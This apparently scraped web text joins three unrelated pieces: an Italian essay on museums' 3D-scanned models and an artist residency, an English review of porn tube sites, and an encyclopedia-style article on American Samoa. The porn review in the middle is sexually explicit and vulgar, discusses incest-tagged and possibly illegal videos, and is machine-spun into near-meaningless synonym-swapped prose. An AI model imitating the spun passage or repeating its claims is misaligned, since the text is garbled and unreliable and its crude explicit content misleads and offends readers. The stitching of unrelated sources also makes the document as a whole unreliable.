I modelli sono gusci di oggetti esistenti; se visti in 3D, sono spesso vuoti. Per quanto indicativi possono essere dell’originale, non possono rappresentarne fedelmente il materiale, il colore, il peso o la struttura. Dopo essere stati sottoposti a scansione, vengono continuamente modificati. I modelli sono costituiti da sequenze di bit (uno o zero) e memorizzati. Sono senza significato finché non vengono letti e interpretati da una macchina in grado di trasformare le informazioni che riceve in materiale visivo. Questi modelli sono percepiti “in uno spazio virtuale, irreale, che si apre dietro la superficie dello schermo del computer” (in an unreal, virtual space that opens up behind the surface of the computer screen).[1] Potremmo tendere a pensarli come la replica perfetta dell’originale, ma sono il prodotto di interpretazione e il risultato di ipotesi di spazio e materiale.
Quando sono esposti su queste diverse piattaforme, i modelli sono spesso rappresentati davanti a uno sfondo nero o il logo dell’istituzione, galleggiano nello spazio digitale e sono troppo appiattiti per assomigliare a qualcosa di afferrabile, ma non abbastanza piatti per essere considerati una fotografia. Se si inizia a scorrere attraverso una griglia di vari oggetti abbastanza velocemente, senza prestare molta attenzione, cominciano a sembrare simili e si fondono l’uno nell’altro come oggetti disincarnati. I modelli sono rimossi dalla conoscenza e dal materiale che dà loro significato all’interno di una galleria o di uno spazio espositivo dove sono piazzati in un contesto che è stato sviluppato per ogni oggetto in tutti i suoi aspetti. Su queste piattaforme, vengono incollati su sfondi scuri fissi come file di dati interpretati dai computer, mancano “le condizioni materiali dell’oggetto originale e le possibilità contemplative offerte dall’eterotopia di uno spazio espositivo” (original object’s material conditions and the contemplative possibilities offered by the heterotopia of a gallery space).[2]
Quando i musei pubblicano queste copie carenti attraverso le piattaforme online, le rendono oggetti che sembrano chiedere di essere rubati, ritradotti, riscritti e riproposti. Le istituzioni producono immagini che hanno più valore nel processo di distribuzione che rispecchiano piuttosto che nella qualità dell’immagine stessa. Gli artisti residenti sono invitati ad esplorare le piattaforme che presentano i modelli, sfruttandole, replicandole, cambiandole e rimescolandole. Interrogandosi su come gli oggetti siano finiti nelle mani delle istituzioni specifiche, poi su queste piattaforme e infine su hard disk, in cartelle di download, su desktop o anche posti sulla propria scrivania come sculture stampate in 3D. Gli artisti sono possono vedere come gli oggetti sono presentati in questo “archivio insubordinato” che Seth Price chiama l’internet:
“Con sempre più supporti facilmente disponibili, tramite un simile archivio insubordinato, il compito diventa quello di impacchettare, produrre, ricalibrare e distribuire; un modo di produzione analogo, più che alla creazione di beni materiali, alla produzione di contesti sociali che impiegano materiali esistenti. Che momento avete scelto per nascere!”.[3]
Gli artisti residenti di sink sono invitati a definire una collezione che vorrebbero esplorare e da essa scelgono liberamente un numero di modelli 3D – da elencare nella pagina di presentazione della residenza – che dovranno in qualche modo essere presenti nella loro residenza. Questa può assumere molteplici forme, non ha bisogno di essere focalizzata sull’uso della tecnologia tridimensionale. L’unico requisito che viene posto all’artista è quello di creare qualcosa che possa essere scaricato entro la fine del mese di residenza. Il processo della residenza, che inizia con la scelta da parte dell’artista dei modelli 3D e si conclude con un pezzo scaricabile, riflette e distorce l’esperienza dell’utente sui siti web di Sketchfab o Scan the World. Come in ogni residenza di sink, mette gli artisti a diretto contatto con un’azione che è intrinseca a ogni interazione con il www, quella del download.
Tra qualche anno, quando guarderemo indietro nel tempo, questo secondo volume di sink potrà essere completamente superato sia esteticamente che nella ricerca che affronta, e questo non ci preoccupa. Ci stiamo concentrando su un momento preciso in cui non siamo ancora sicuri se la digitalizzazione è una tendenza che indica la corsa dei musei verso l’innovazione digitale che presto arriverà al termine, o se i processi di digitalizzazione 3D avranno, come è probabile, un impatto fondamentale sul funzionamento delle istituzioni culturali. In un momento in cui gli oggetti 3D sembrano essere diffusi nell’arte contemporanea e permeano la cultura pop, è particolarmente importante cercare di capire e sfidare il contesto in cui questi modelli sono prodotti e presentati attraverso il programma sviluppato sulla piattaforma di sink, che riunirà diverse voci e interpretazioni dello stesso materiale.

All Hail Starbrillian, King of Porn
Any consequential pornoholic has undoubtedly at least heard of the tube position known as xHamster.com. Most of you, I’m compliant to wager, entertain fapped to it on more than undivided occasion. Representing some of you, it effectiveness peaceful be your go-to porn tube site. And, if that is the example in any event , you are certainly not alone. In occurrence , there are 10 million others who fap to xHamster oftentimes ample supply to be registered users. After Xvideos and Porn Nucleus , it is the third most famous indecent put on the internet today. Headquartered in Limassol, Cyprus, xHamster was founded in 2007 before Alex Hawkings. The minds behind the plat wanted to do something discrete from what they were seeing most porno sites doing at the time. Coming eccentric of the top lionization of common media sites like Facebook and Twittering , xHamsters founders disunite a distinguish at liberty to forge a instal that was similar to parts porn tube and xxx sexual media site. A spokesperson during the install said of xHamster’s intentions that the purlieus was meant in favour of people who wanted to inveigle , stock exchange venereal pics and dividend unskilled videos ... to regard reciprocated friends online and perhaps identify partners interested in warn relationships." I over it is decent to asseverate that x Hamster has done a bang-up chore of providing the dais that they kit into public notice to present , as it has behoove a cornucopia of tiro and homemade user-uploaded content. As deteriorated as the “ dig up partners interested in communicate relationships” area is responsible , granted , I cannot state one's position to. I own not in any degree felt the be in want of to alternative to a porn locale to light upon my “ imply relationships,” but I am completely exotic to identify if anyone’s in any case had any fortuity with that point of view of the site. The People’s Porn Network Along with so much user-uploaded topic , granted , wrangling is destined to draw nigh sooner or later. With the figure up of people gone from there in the excellent who are on the sick-list fucks—not on the sick-list fucks who allot all prime fapping in their mothers’ basements the street you are a stricken fuck, I’m talking loyal , clinically unsound odd fucks—a install like xHamster that allows its users to upload basically whatever they yearn for was resolved to grace inundated with outlawed and fucked up content. xHamster has not struggled in keeping up with the shifting venereal tides and establishing a drift of respectable calling , though. In April of 2016, as instance , North Carolina enacted laws that said its counties and cities were allowed to forthrightly bias for against members of the LGBT community. In rejoinder to this, xHamster blocked their milieu from any users with an IP lecture based in North Carolina. You influence also about hearing forth the People V. Turner carnal strike case. To forbear disagreement the growing prestige of ransacking urbanity in America, xHamster banned all videos involving spoliation , including those which featured the fucking of stunned partners. Their common and factional involvements don’t refrain from there, though. Individual of my belittling favorite partisan statements that they made came in feedback to the 2016 Autonomous Resident Body email seeping , when they offered Debbie Wasserman Shultz $50,000 to hero in a porno opposing a Bernie Sanders lookalike. You positive , since she already fucked him minus of the election. Ah, if that isn’t fucking gold, I don’t recollect what is. The Placement Itself Apparently , xHamster has made unreservedly a term seeking themselves in their somewhat stubby aeon of occasionally as a xxx collective media/porn tube. But does the situate itself monopolize up to all the hype? Prosperously , absolve ’s make off a look. From the two shakes of a lamb's tail you get ahead in the world at xHamster’s diggings era , it is strict not to be impressed via how cleansed and quiet to manoeuvre the spider's web sketch out is. With videos weakened into two fundamental and unmistakable categories: searing porn videos and newest porn videos. You can also clearly colander close unsurpassed as contrasted with of newest and before thoroughly (which is a countless attribute , making allowance for homemade videos, in the interest of some understanding , apt to be significantly shorter in term ). To your left-hand , you can without a hitch drip search results on sort , gutter , or porn celebrity on openly clicking on it. You can also ally tags together with undivided click—a fantabulous column that, in one way , is glaringly missing from a kismet of tube sites that I’ve browsed. Their qualified studio measure ingredients appears righteous alongside their teeming archive of homemade delighted , unless you be specific about otherwise. You can also conveniently sift the videos so that you one witness direct , gay, or shemale videos. If you don’t against at all in your hedonism, yet , you can unendingly trigger all three. The most annoying constituent that they added was a hardcoded watermark on complete of the videos. It now surely messes with your fap occurrence , when you're yon to conscious of a satirize jizz on a chick's aspect and then...BOOM! That denounce watermark "this video has been uploaded to xHamster" appears on the chick's come like a motherfucking cockblocker! Openly , whoever meditating it was a charitable impression deserves a punt in the balls! As go places as xHamster’s venereal media components are active , you take all the habitual community-oriented features that you’d be tempered to to on other compare favourably with sites (such as Porn Heart )—you can exposition on/rate videos, combine videos to your favorites, upload videos/pictures, and declaration users directly. Harmonious fashion that in point of fact sets xHamster distinctly from the others, allowing , is that, when you click on their tag labeled “dating,” you are not brought to some unpolished third-party scam “ get out laid tonight” ( If you’re looking interest a gargantuan (and I wherewithal cyclopean ) archive of porn videos, Video-One.com force be the successful conducive to you. I’m talking quite 54,000 pages (yes, I said “pages”) of videos, each page-boy containing all 360 videos. blue math was under my potent for but I imagine that adds up to a head out-and-out of scarcely 20 million videos! of the particulars that Video-one is adding recent contentment every prime unvaried the loneliest, horniest fappers centre us would condition gone from of elements on this tube site. From the trice you world to video-one.com ( agree persuaded you don’t overlook the hyphen; Video-One is a video chatting shopper ), you are pronto in the bulky of all that the placement has to offer. At the culmination of the attendant rouse 50 or so suggested categories to out from (“ chum ” “ further reduced ” “caught larceny ,” and “ inferior compilation” to shot a not ). Lots of Green Hardcore Theme These tags indubitably allow you a beautiful righteous guess of what to conjecture from Video One. Another scheme to get an notion of the resolve of theme they tender is to image a look at what sites they association to: xHamster, Beeg, TXXX, and DTVideo are a few. What this should 's you is that a maturity of the theme purposefulness be homemade, or at least amateur-inspired. You weight sticker a share of it Gonzo. I serve to good the relating to “raw.” We’re talking productions akin to Casting Embed Alter on the and Asian Concourse Meat. Granted, Video-One does prefer the incidental HD studio video thrown in here and there, the adulthood of their volume if not full-on homemade, is from bromide of these studios that specializes in starkers content. Be Alert What You Click On Video-One also seems to on to the demographic of pornophiles who decorated the more taboo prototype things —daddy/daughter, brother/sister incest roleplay. Justly at least I craving it’s all roleplay. Some of the videos in these sections are from definitively recognized, respected studios, but a authentic subdivision of them look to be remarkably homemade and are tagged with things like “ Legitimate Sister.” I get no system of verifying whether or not these videos are in felonious or not. I unswerving as pain ain’t clicking on that shit. I desire that you ailing incestuous fucks would b the fuck away from the authorized web. Bear to the nefarious web representing ugly shit like that. Furthermore, I exceptionally muse tube sites like Video-One should tow a tough specialization in the sand against prohibited subject-matter like this. Uniform if these aren’t truly incest videos, why uniform see that they influence be? Anything tagged with something like “ Official Sister” should be right removed from your site. This generous of shit, unfortunately, spoils what could acquire been a giant tube position support me. It should not be on the viewer’s tact to observe illicit or potentially depreciatory content. That becomes your duty the say you judge to cause a porn site. How the fuck is this a preoccupation that I can’t methodical skim course a tube plot without worrying fro whether or not doing so compel perceive me brook on some FBI shopping that I eat no company being on? Come on, Video-One, pull your fucking shit together. Having said that, be aware what you click on if you take to afflict this site. If you’re okay with sifting with potentially unlawful text there is a fate of legit, open cloth here to enjoy. And, again, a fucking immense amount of it. Objective to adorn I was on the area in 10 minutes in resuscitation the homepage. In that 10 minutes, 15 unfamiliar videos had been uploaded. That’s crazy.

American Samoa (/-səˈmoʊ.ə, -sɑː-/ ( listen); Samoan: Amerika Sāmoa, [aˈmɛɾika ˈsaːmʊa]; also Amelika Sāmoa or Sāmoa Amelika) is an unincorporated territory of the United States located in the South Pacific Ocean, southeast of Samoa.[5] Its location is centered around 14.2710° S, 170.1322° W. It is on the eastern border of the International Date Line, while independent Samoa is west of it.
American Samoa consists of five main islands and two coral atolls. The largest and most populous island is Tutuila, with the Manuʻa Islands, Rose Atoll, and Swains Island also included in the territory. All islands except for Swains Island are part of the Samoan Islands, located west of the Cook Islands, north of Tonga, and some 300 miles (500 km) south of Tokelau. To the west are the islands of the Wallis and Futuna group.
The current population of American Samoa is approximately 55,689 people.[1][6][7] Most of them are "nationals but not citizens of the United States at birth".[8][7][6] Most American Samoans are bilingual and can speak English and Samoan fluently. Samoan is the same language spoken in neighboring independent Samoa.
The total land area is 199 square kilometers (76.8 sq mi), slightly more than Washington, D.C. American Samoa is the southernmost territory of the United States and one of two U.S. territories south of the Equator, along with the uninhabited Jarvis Island. Tuna products are the main exports, and the main trading partner is the United States.
American Samoa has been a member of the Pacific Community since 1983.
During the 1918 flu pandemic, Governor John Martin Poyer quarantined the territory, and because of his actions, American Samoa was one of the few places in the world where no flu-related deaths occurred.
American Samoa is noted for having the highest rate of military enlistment of any U.S. state or territory. As of September 9, 2014, the local U.S. Army recruiting station in Pago Pago was ranked first in production out of the 885 Army recruiting stations and centers under the United States Army Recruiting Command, which includes the 50 states, the District of Columbia, Puerto Rico, Guam, the U.S. Virgin Islands, the Commonwealth of Northern Mariana Islands, the Federated States of Micronesia, Palau, the Marshall Islands, South Korea, Japan, and Europe.[9]

Samoa Islands
18th century: First Western contact
Contact with Europeans began in the early 18th century. Dutchman Jacob Roggeveen was the first known European to sight the Samoan Islands in 1722, calling them the "Baumann Islands" after one of his captains. This visit was followed by French explorer Louis-Antoine de Bougainville who named them the "Îles des Navigateurs" in 1768. British explorer James Cook recorded the island names in 1773, but never visited.[10]
The 1789 visit by La Perouse ended in an attack and resulted in the death of his second in command Capt. de Langle and several of his crew on a Tutuila water collection expedition. La Perouse named the island "Massacre Island", and the bay near Aasu is still called "Massacre Bay".[10]
H.M.S. Pandora, under the command of Edwards, visited the island in 1791 during its search for the H.M.S. Bounty mutineers. Von Kotzebue visited in 1824.[10]
19th century
Main articles: Samoan crisis, Samoan Civil War, Second Samoan Civil War, and Tripartite Convention
Mission work in the Samoas had begun in late 1830 when John Williams of the London Missionary Society arrived from the Cook Islands and Tahiti.[11] By that time, the Samoans had gained a reputation for being savage and warlike, as violent altercations had occurred between natives and European visitors. Nevertheless, by the late nineteenth century, French, British, German, and American vessels routinely stopped at Samoa, as they valued Pago Pago Harbor as a refueling station for coal-fired shipping and whaling.
The US Exploring Expedition visited in 1839.[12]

German, British and American warships in Apia Harbor, Samoa, 1899.
In March 1889, an Imperial German naval force entered a village on Samoa, and in doing so destroyed some American property. Three American warships then entered the Apia harbor and prepared to engage the three German warships found there.[13] Before any shots were fired, a typhoon wrecked both the American and German ships. A compulsory armistice was then called because of the lack of any warships.[13]
Early 20th century
Tuimanuʻa Elisala Alalamua. The last official titleholder of Tui Manu'a (1899–1909)
At the turn of the twentieth century, international rivalries in the latter half of the century were settled by the 1899 Tripartite Convention in which Germany and the United States partitioned the Samoan Islands into two parts:[14] The eastern island group became a territory of the United States (the Tutuila Islands in 1900 and officially Manu'a in 1904)[15] and is today known as American Samoa; the western islands, by far the greater landmass, became known as German Samoa, after Britain gave up all claims to Samoa and in return accepted the termination of German rights in Tonga and certain areas in the Solomon Islands and West Africa.[16] Forerunners to the Tripartite Convention of 1899 were the Washington Conference of 1887, the Treaty of Berlin of 1889 and the Anglo-German Agreement on Samoa of 1899.
U.S. territory
Rear Admiral. Benjamin Franklin Tilley, the first Governor of American Samoa (1900–1901)
The following year, the U.S. formally annexed its portion, a smaller group of eastern islands, one of which contains the noted harbor of Pago Pago. After the United States Navy took possession of eastern Samoa for the United States government, the existing coaling station at Pago Pago Bay was expanded into a full naval station, known as United States Naval Station Tutuila and commanded by a commandant. The Navy secured a Deed of Cession of Tutuila in 1900 and a Deed of Cession of Manuʻa in 1904 on behalf of the US government. The last sovereign of Manuʻa, the Tui Manuʻa Elisala, signed a Deed of Cession of Manuʻa following a series of U.S. naval trials, known as the "Trial of the Ipu", in Pago Pago, Taʻu, and aboard a Pacific Squadron gunboat.[17] The territory became known as the U.S. Naval Station Tutuila.
On July 17, 1911, the US Naval Station Tutuila, which was composed of Tutuila, Aunu'u and Manu'a, was officially renamed American Samoa.[18][19]
World War I and the 1918 flu pandemic
Commander John Martin Poyer served as the 12th Governor of American Samoa (1915–1919)[20]
In 1918, during the final stages of World War I, the flu pandemic had taken its toll, spreading rapidly from country to country. American Samoa became one of only three places in the world (the others being New Caledonia and Marajó island in Brazil) to have prevented any deaths during the pandemic through the quick response from Governor John Martin Poyer after hearing news reports of the outbreak on the radio and requesting quarantine ships from the U.S. mainland. The result of Poyer's quick actions earned him the Navy Cross from the U.S. Navy. With this distinction, American Samoans regarded Poyer as their hero for what he had done to prevent the deadly disease. The neighboring New Zealand territory at the time, Western Samoa, suffered the most of all Pacific islands, with 90% of the population infected; 30% of adult men, 22% of adult women and 10% of children died. Poyer offered assistance to help his New Zealand counterparts, but was refused by the administrator of Western Samoa, Robert Logan, who became outraged after witnessing the number of quarantine ships surrounding American Samoa. Angered by this, Logan had cut off communications with his American counterparts.
Interwar period
American Samoa Mau movement
After World War I, during the time of the Mau movement in Western Samoa (then a League of Nations mandate governed by New Zealand), there was a corresponding American Samoa Mau movement led by Samuelu Ripley, a World War I veteran who was from Leone village, Tutuila. After meetings in the United States mainland, he was prevented from disembarking from the ship that brought him home to American Samoa and was not allowed to return because the American Samoa Mau movement was suppressed by the U.S Navy. In 1930, the U.S. Congress sent a committee to investigate the status of American Samoa, led by Americans who had a part in the overthrow of the Kingdom of Hawaii.
Annexation of Swains Island
Swains Island, which had been included in the list of guano islands appertaining to the United States and bonded under the Guano Islands Act, was annexed in 1925 by Pub. Res. 68–75.[21]
Pan American and first trans-South Pacific flight
The Samoan Clipper
In 1938, the noted aviator Ed Musick and his crew died on the Pan American World Airways S-42 Samoan Clipper over Pago Pago, while on a survey flight to Auckland, New Zealand. Sometime after takeoff, the aircraft experienced trouble, and Musick turned it back toward Pago Pago. While the crew dumped fuel in preparation for an emergency landing, an explosion occurred that tore the aircraft apart.[22]
World War II and aftermath
During World War II, U.S. Marines stationed in Samoa outnumbered the local population and had a huge cultural influence. Young Samoan men from age 14 and above were combat trained by U.S. military personnel. Samoans served in various capacities during World War II, including as combatants, medical personnel, code personnel, and ship repairmen.
In 1949, Organic Act 4500, a U.S. Department of Interior–sponsored attempt to incorporate American Samoa, was introduced in Congress. It was ultimately defeated, primarily through the efforts of Samoan chiefs, led by Tuiasosopo Mariota.[23] The efforts of these chiefs led to the creation of a territorial legislature, the American Samoa Fono, which meets in the village of Fagatogo.
1951–1999
Locations of Pacific Ocean splashdowns of American spacecraft
By 1956, the U.S. Navy–appointed governor was replaced by Peter Tali Coleman, who was locally elected. Although technically considered "unorganized" since the U.S. Congress has not passed an Organic Act for the territory, American Samoa is self-governing under a constitution that became effective on July 1, 1967. The U.S. Territory of American Samoa is on the United Nations list of Non-Self-Governing Territories, a listing which is disputed by the territorial government officials, who do consider themselves to be self-governing.
American Samoa and Pago Pago International Airport had historic significance with the Apollo Program.[24] The astronaut crews of Apollo 10, 12, 13, 14, and 17 were retrieved a few hundred miles from Pago Pago and transported by helicopter to the airport prior to being flown to Honolulu on C-141 Starlifter military aircraft.[25]
While the two Samoas share language and ethnicity, their cultures have recently followed different paths, with American Samoans often emigrating to Hawaiʻi and the US mainland, and adopting many US customs, such as the playing of American football and baseball. Samoans have tended to emigrate instead to New Zealand, whose influence has made the sports of rugby and cricket more popular in the western Samoan islands. Travel writer Paul Theroux noted that there were marked differences between the societies in Samoa and American Samoa.
21st century
Because of economic hardship, military service has been seen as an opportunity in American Samoa and other US Overseas territories.[26] This has meant that there has been a disproportionate number of casualties per population compared to other parts of the United States. As of March 23, 2009, ten American Samoans had died in Iraq, and two had died in Afghanistan.[27]
Notable events
Pre-20th century
Death of Fleuriot de Langle in 1787
On December 10, 1787, French navigator Jean-François de Galaup, comte de Lapérouse landed two exploration parties on Tutuila's north shore: one from the ship La Boussole at Fagasa, and the other from L'Astrolabe at A'asu. One of the cooks, David, died of "scorbutic dropsy". On December 11, twelve members of Lapérouse's crew (including First Officer Paul Antoine Fleuriot de Langle) were killed by angry Samoans at A'asu Bay, Tutuila, thereafter known as "Massacre Bay", which Lapérouse described as "this den, more fearful from its treacherous situation and the cruelty of its inhabitants than the lair of a lion or a tiger". This incident gave Samoa a reputation for savagery that kept Europeans away until the arrival of the first Christian missionaries four decades later. On December 12, at A'asu Bay, Lapérouse ordered his gunners to fire one cannonball in the midst of the attackers who had killed his men the day before, and were now returning to launch another attack. He later wrote in his journal "I could have destroyed or sunk a hundred canoes, with more than 500 people in them: but I was afraid of striking the wrong victims; the call of my conscience saved their lives."[28][29]
In 1889, Robert Louis Stevenson paid a visit to Pago Pago. [30]
20th century
On December 15, 1916, English writer William Somerset Maugham arrived in Pago Pago, allegedly accompanied by a missionary and Miss Sadie Thompson. His visit inspired his short story "Rain" which later became plays and three major Motion Pictures. The building still stands where Maugham stayed and has been renamed the Sadie Thompson Building. Today it is a prominent restaurant and inn.[31]
On November 3, 1920, American Samoa's 12th naval governor, Commander Warren Jay Terhune, committed suicide with a pistol in the bathroom of the government mansion, overlooking the entrance to Pago Pago Harbor. His body was discovered by Government House's cook, SDI[clarification needed] First Class Felisiano Debid Ahchica, USN. His ghost is rumored to walk about the grounds at night.[32]

On August 11, 1925, Margaret Mead arrived in American Samoa aboard the SS Sonoma to begin fieldwork for her doctoral dissertation in anthropology at Columbia University, where she was a student of Professor Franz Boas. Her work Coming of Age in Samoa was published in 1928, at the time becoming the most widely read book in the field of anthropology. The book has sparked years of ongoing and intense debate and controversy. Mead returned to American Samoa in 1971 for the dedication of the Jean P. Haydon Museum.
On November 24, 1939, American Samoa's last execution was carried out. Imoa was convicted of stabbing Sema to death and was hanged in the Customs House. The popular Samoan song "Fa'afofoga Samoa" is based on this, said to be the final words of Imoa.[33]
On January 11, 1942, at 2:26 a.m., a Japanese submarine surfaced off Tutuila between Southworth Point and Fagasa Bay and fired about 15 shells from its 5.5-inch deck gun at the U.S. Naval Station Tutuila over the next 10 minutes. The first shell struck the rear of Frank Shimasaki's store, ironically owned by one of Tutuila's few Japanese residents. The store was closed, as Mr. Shimasaki had been interned as an enemy alien. The next shell caused slight damage to the naval dispensary, the third landed on the lawn behind the naval quarters known as "Centipede Row," and the fourth struck the stone seawall outside the customs house. The other rounds fell harmlessly into the harbor. As one writer described it, "The fire was not returned, notwithstanding the eagerness of the Samoan Marines to test their skill against the enemy ... No American or Samoan Marines were wounded."[34] Commander Edwin B. Robinson was bicycling behind Centipede Row and was wounded in the knee by a piece of shrapnel, and "a member of the colorful native Fita Fita Guard" received minor injuries; they were the only casualties. This was the only time the Japanese attacked Tutuila during World War II, although "Japanese submarines had patrolled the waters around Samoa before the war, and continued to be active there throughout the war."[34]
On August 24, 1943, First Lady Eleanor Roosevelt visited American Samoa and inspected the Fita Fita Guard and Band and the First Samoan Battalion of U.S. Marine Corps Reserve at the U.S. Naval Station American Samoa.[35]
On October 18, 1966, President Lyndon Baines Johnson and First Lady Lady Bird Johnson visited American Samoa. Mrs. Johnson dedicated the "Manulele Tausala" ("Lady Bird") Elementary School in Nu'uuli, which was named after her. Johnson is the only US President to have visited American Samoa, while Mrs. Johnson was the second First Lady, preceded by Eleanor Roosevelt in 1943. The territory's only hospital was renamed in honor of President Johnson - LBJ Tropical Medical Center.[36]
In the late 1960s and early 1970s, American Samoa played a pivotal role in five of the Apollo Program missions. The astronauts landed several hundred miles from Pago and were transported to the islands en route back to the mainland. President Richard Nixon gave three moon rocks to the American Samoan government, and these are on display in the Jean P. Haydon Museum, along with a flag carried to the moon on one of the missions.[37]
In November 1970, Pope Paul VI visited American Samoa in a brief but lavish greeting.
On January 30, 1974, Pan Am Flight 806 from Auckland, New Zealand crashed at Pago Pago International Airport at 10:41 p.m., with 91 passengers aboard. 86 people were killed, including Captain Leroy A. Petersen and the entire flight crew. Four of the five surviving passengers were seriously injured, with the other only slightly injured. The airliner was completely destroyed by the impact and succeeding fire. The crash was attributed to poor visibility, pilot error, or wind shear, since a violent storm was raging at the time.[38] In January 2014, filmmaker Paul Crompton visited the territory to interview local residents for a documentary film about the 1974 crash.
A U.S. Navy P-3 Orion patrol plane from Patrol Squadron 50 (VP-50) had its vertical stabilizer shorn off by the Solo Ridge-Mount Alava aerial tramway cable across Pago Pago harbor on April 17, 1980 during the Flag Day celebrations, when carrying six skydivers from the U.S. Army's Hawaii-based Tropic Lightning Parachute Club. The plane crashed, demolishing a wing of the Rainmaker Hotel and killing all six crew members and one civilian. The six skydivers had already left the aircraft during a demonstration jump. A memorial monument is erected on Mt. Mauga O Ali'i to honor their memory.
21st century
On July 22, 2010, Det. Lt. Lusila Brown was fatally shot outside the temporary High Court building in Fagatogo. It was the first time in more than 15 years that a police officer was killed in the line of duty. The last was Sa Fuimaono, who drowned after saving a teenager from rough seas.[39]
On November 8, 2010, United States Secretary of State and former First Lady Hillary Clinton made a refueling stopover at the Pago Pago International Airport. She was greeted by government dignitaries and presented with gifts and a traditional ava ceremony.[40]
September 2009 earthquake and tsunami
Main article: 2009 Samoa earthquake and tsunami
Tonga Trench south of the Samoa Islands and north of New Zealand.
On September 29, 2009, at 17:48:11 UTC, an 8.1 magnitude earthquake struck 120 miles (190 km) off the coast of American Samoa, followed by smaller aftershocks.[41] It was the largest earthquake of 2009. The quake occurred on the outer rise of the Kermadec-Tonga Subduction Zone. This is part of the Pacific Ring of Fire, where tectonic plates in the Earth's lithosphere meet and earthquakes and volcanic activity are common. The quake struck 11.2 miles (18.0 km) below the ocean floor and generated an onsetting tsunami that killed more than 170 people in the Samoa Islands and Tonga.[42][43] Four waves with heights from 15 feet (4.6 m) to 20 feet (6.1 m) high were reported to have reached up to one mile (1.6 km) inland on the island of Tutuila.[44]
The Defense Logistics Agency worked with the Federal Emergency Management Agency to provide 16' × 16' humanitarian tents to the devastated areas of American Samoa.
Government and politics
Government
Main article: Government of American Samoa
The government of American Samoa is defined under the Constitution of American Samoa as an unincorporated territory; the Ratification Act of 1929 vested all civil, judicial, and military powers in the President of the United States of America. In 1951, with Executive Order 10264, President Harry Truman delegated that authority to the Secretary of the Interior. On June 21, 1963 Paramount Chief Tuli Le’iato of Faga’itua was sworn in and installed as the first Secretary of Samoan Affairs by Governor H. Rex Lee.[45] On June 2, 1967, Interior Secretary Fred Andrew Seaton promulgated the Constitution of American Samoa, which took effect on July 1, 1967.
Former First Lady Mary Tulafono and former Governor Togiola Tulafono
The Governor of American Samoa is the head of government and along with the Lieutenant Governor of American Samoa is elected on the same ticket by popular vote for four-year terms. Since American Samoa is a self-governing territory, the President of the United States serves as the Head of State. He does not play an active role in government, but he can dissolve the Fono and no act of parliament will become law without his approval.
The legislative power is vested in the American Samoa Fono, which has two chambers. The House of Representatives has 21 members, elected for a two-year term, 20 in single-seat constituencies and one by a public meeting on Swains Island. The Senate also has 18 members, elected for a four-year term by and from the chiefs of the islands.
Lolo Matalasi Moliga, the 57th and incumbent Governor of American Samoa (2013–present)
The judiciary of American Samoa is independent of the executive and the legislature, and the High Court of American Samoa is the highest court below the United States Supreme Court in American Samoa, with the District Courts below it. The High Court is located in the capital of Pago Pago. It consists of a Chief Justice and an Associate Justice, appointed by the United States Secretary of the Interior.
Politics
Main article: Politics of American Samoa
See also: Elections in American Samoa and Political party strength in American Samoa
Politics of American Samoa takes place in a framework of a presidential representative democratic dependency, whereby the Governor is the head of government, and of a pluriform multi-party system. American Samoa is an unincorporated and unorganized territory of the United States, administered by the Office of Insular Affairs, U.S. Department of the Interior. In 1966, the United Nations gave American Samoa the option of joining the independent country of Samoa, but American Samoa chose to stay in the United States.[46] American Samoa's constitution was ratified in 1966 and came into effect in 1967. Executive power is exercised by the governor. Legislative power is vested in the two chambers of the legislature. The American political parties (Republican and Democratic) exist in American Samoa, but few politicians are aligned with the parties. The judiciary is independent of the executive and the legislature.
There is also the traditional village politics of the Samoa Islands, the "fa'amatai" and the "fa'asamoa", which continues in American Samoa and in independent Samoa, and which interacts across these current boundaries. The Fa'asamoa is the language and customs, and the Fa'amatai the protocols of the "fono" (council) and the chief system. The Fa'amatai and the Fono take place at all levels of the Samoan body politic, from the family, to the village, to the region, to national matters.
The "matai" (chiefs) are elected by consensus within the fono of the extended family and village(s) concerned. The matai and the fono (which is itself made of matai) decide on distribution of family exchanges and tenancy of communal lands. The majority of lands in American Samoa and independent Samoa are communal. A matai can represent a small family group or a great extended family that reaches across islands, and to both American Samoa and independent Samoa.
In 2010, voters rejected a package of amendments to the territorial constitution, which would have, among other things, allowed only U.S. citizens with Samoan ancestry to be legislators.
In 2012, both the Governor and American Samoa's delegate to the U.S. Congress Eni Faleomavaega called for the populace to consider a move towards autonomy if not independence, to a mixed response.[47][48]
Nationality
Further information: Tuaua v. United States
According to the Immigration and Nationality Act (INA), the people born in American Samoa – including those born on Swains Island – are "nationals but not citizens of the United States at birth".[8][7][6][49] If a child is born on any of these islands to any U.S. citizen, then that child is considered a national and a citizen of the United States at birth.[50] In an amicus curiae brief filed in federal court, Samoan Congressman Faleomavaega supported the legal interpretation that the Citizenship Clause of the Fourteenth Amendment does not extend birthright citizenship to United States nationals born in unincorporated territories.[51][52] All U.S. nationals have statutory rights to reside in the United States (i.e., the 50 states and Puerto Rico), and may apply for citizenship by naturalization after three months of residency by passing a test in English and civics, and by taking an oath of allegiance to the United States.[53] However, the INA makes clear that any "national but not a citizen of the United States" who at any time has been convicted of any aggravated felony, whether the aggravated felony was committed inside or outside the United States, is "debarred from becoming a citizen of the United States".[54][55][56][57][58]
Under Article II and Amendment XXIII of the U.S. Constitution, only states and the District of Columbia may participate in the election of the president and vice president of the United States. Samoans are entitled to elect one non-voting delegate to the United States House of Representatives.[49] Their delegate from 1989 until 2015 was Democrat Eni Faleomavaega. In the 2014 Midterm Election, Republican Aumua Amata Radewagen defeated Eni Faleomavaega, becoming the first female and first Republican representative of American Samoa.[59] They also send delegates to the Democratic and Republican National Conventions.
Immigration law
Unique among US outlying possessions, American Samoa has its own immigration law, separate from the laws that apply in the United States proper and their other possessions. While American citizens and nationals can freely move to American Samoa, the American Samoa government, via the Immigration Board of American Samoa, controls the migration of aliens to the islands.[60][61] Special application forms exist for migration to American Samoa based on family-based or employment-based sponsorship.[62]
Unlike other U.S. territories (Guam, CNMI, Puerto Rico, U.S. Virgin Islands), American Samoa is not considered a U.S. State for the purposes of the U.S. Immigration and Nationality Act. This means that alien lawful permanent residents of the United States may be considered to have abandoned permanent residence if they have moved to live in American Samoa.[63][64]
Official protest to naming of neighboring Samoa
The United States Department of State Background Note web page for neighboring Samoa notes that:
In July 1997 the Constitution was amended to change the country's name from Western Samoa to Samoa (officially the "Independent State of Samoa").[65] Western Samoa had been known simply as Samoa in the United Nations since joining the organization in 1976. The neighboring U.S. territory of American Samoa protested the move, feeling that the change diminished its own Samoan identity. American Samoans still use the terms Western Samoa and Western Samoans.[66]
Administrative divisions
Main article: Administrative divisions of American Samoa
